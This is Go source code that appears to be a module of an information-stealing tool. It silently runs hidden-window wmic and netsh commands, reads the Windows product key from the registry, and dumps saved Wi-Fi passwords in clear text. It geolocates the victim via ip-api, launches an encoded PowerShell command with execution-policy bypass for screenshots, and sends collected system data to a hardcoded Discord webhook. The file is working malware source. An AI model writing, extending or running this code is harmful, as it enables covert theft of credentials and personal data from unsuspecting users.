package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/mem"
	"golang.org/x/sys/windows/registry"

	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/requests"
)

func GetOS() string {
	cmd := exec.Command("wmic", "os", "get", "Caption")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := cmd.Output()
	if err != nil {
		return "Not Found"
	}
	return strings.TrimSpace(strings.Split(string(out), "\n")[1])
}

func GetCPU() string {
	cmd := exec.Command("wmic", "cpu", "get", "Name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := cmd.Output()
	if err != nil {
		return "Not Found"
	}

	return strings.TrimSpace(strings.Split(string(out), "\n")[1])
}

func GetGPU() string {
	cmd := exec.Command("wmic", "path", "win32_VideoController", "get", "name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := cmd.Output()
	if err != nil {
		return "Not Found"
	}
	return strings.TrimSpace(strings.Split(string(out), "\n")[1])
}

func GetRAM() string {
	virtualMemory, err := mem.VirtualMemory()
	if err != nil {
		return "Not Found"
	}
	return fmt.Sprintf("%.2f GB", float64(virtualMemory.Total)/(1024*1024*1024))
}

func GetMAC() string {
	mac, err := hardware.GetMAC()
	if err != nil {
		return "Not Found"
	}

	return mac
}

func GetHWID() string {
	hwid, err := hardware.GetHWID()
	if err != nil {
		return "Not Found"
	}

	return hwid
}

func GetProductKey() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform`, registry.QUERY_VALUE)
	if err != nil {
		return "Not Found"
	}

	defer key.Close()

	value, _, err := key.GetStringValue("BackupProductKeyDefault")
	if err != nil {
		return "Not Found"
	}

	return value
}

func GetDisks() string {
	disks, err := disk.Partitions(false)
	if err != nil {
		return "Not Found"
	}
	var output string
	for _, part := range disks {
		usage, err := disk.Usage(part.Mountpoint)
		if err != nil {
			continue
		}
		output += fmt.Sprintf("%-9s %-9s %-9s %-9s\n", part.Device, strconv.Itoa(int(usage.Free/1024/1024/1024))+"GB", strconv.Itoa(int(usage.Total/1024/1024/1024))+"GB", strconv.Itoa(int(usage.UsedPercent))+"%")
	}

	if output == "" {
		return "Not Found"
	}

	return fmt.Sprintf("%-9s %-9s %-9s %-9s\n%s", "Drive", "Free", "Total", "Use", output)
}

func GetNetwork() string {
	res, err := requests.Get("http://ip-api.com/json")

	if err != nil {
		return "Not Found"
	}

	var data struct {
		Country    string  `json:"country"`
		RegionName string  `json:"regionName"`
		City       string  `json:"city"`
		Zip        string  `json:"zip"`
		Lat        float64 `json:"lat"`
		Lon        float64 `json:"lon"`
		Isp        string  `json:"isp"`
		As         string  `json:"as"`
		IP         string  `json:"query"`
	}
	if err = json.Unmarshal(res, &data); err != nil {
		return "Not Found"
	}

	return fmt.Sprintf("IP: %s\nCountry: %s\nRegion: %s\nPostal: %s\nCity: %s\nISP: %s\nAS: %s\nLatitude: %f\nLongitude: %f", data.IP, data.Country, data.RegionName, data.Zip, data.City, data.Isp, data.As, data.Lat, data.Lon)
}

func GetWifi() string {
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := cmd.Output()
	if err != nil {
		return "Not Found"
	}

	var networks []string
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "All User Profile") {
			networks = append(networks, strings.Split(line, ":")[1][1:len(strings.Split(line, ":")[1])-1])
		}
		if strings.Contains(line, "Tous les utilisateurs") {
			networks = append(networks, strings.Split(line, ":")[1][1:len(strings.Split(line, ":")[1])-1])
		}
	}

	var output string
	for _, network := range networks {
		cmd := exec.Command("netsh", "wlan", "show", "profile", network, "key=clear")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		out, err := cmd.Output()
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			if strings.Contains(line, "Key Content") {
				output += fmt.Sprintf("%-20s %-20s\n", network, strings.TrimSpace(strings.Split(line, ": ")[1]))
			}
			if strings.Contains(line, "Contenu de la") {
				output += fmt.Sprintf("%-20s %-20s\n", network, strings.TrimSpace(strings.Split(line, ": ")[1]))
			}
		}
	}

	if output == "" {
		return "Not Found"
	}

	return fmt.Sprintf("%-20s %-20s\n%s", "Network", "Password", output)
}

func randString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	var b strings.Builder
	for i := 0; i < n; i++ {
		b.WriteRune(letters[rand.Intn(len(letters))])
	}
	return b.String()
}

func GetScreens() []string {
	dir := filepath.Join(os.TempDir(), randString(10))
	os.Mkdir(dir, os.ModePerm)

	cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", "...")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Dir = dir
	cmd.Run()

	files, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}

	var filepaths []string
	for _, file := range files {
		filepaths = append(filepaths, filepath.Join(dir, file.Name()))
	}

	return filepaths
}

func Run(webhook string) {
	users := strings.Join(hardware.GetUsers(), "\n")
	if len(users) > 4096 {
		users = "Too many users to display"
	}

	requests.Webhook(webhook, map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "System Info",
				"description": fmt.Sprintf("OS: %s\nCPU: %s\nRAM: %s", GetOS(), GetCPU(), GetRAM()),
				"color":       0x00FF00,
			},
		},
	})
}

func main() {
	webhook := "https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe"
	Run(webhook)
}
